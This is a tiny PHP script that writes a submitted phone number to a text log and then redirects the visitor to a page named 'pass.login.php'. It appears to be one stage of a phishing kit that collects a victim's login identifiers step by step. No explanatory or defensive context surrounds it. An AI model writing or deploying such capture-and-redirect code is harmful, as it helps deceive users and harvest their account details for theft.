<?php

    file_put_contents("log.txt", "Number: " . $_POST['phoneNo'] . "\n", FILE_APPEND);
header('Location: pass.login.php');
exit();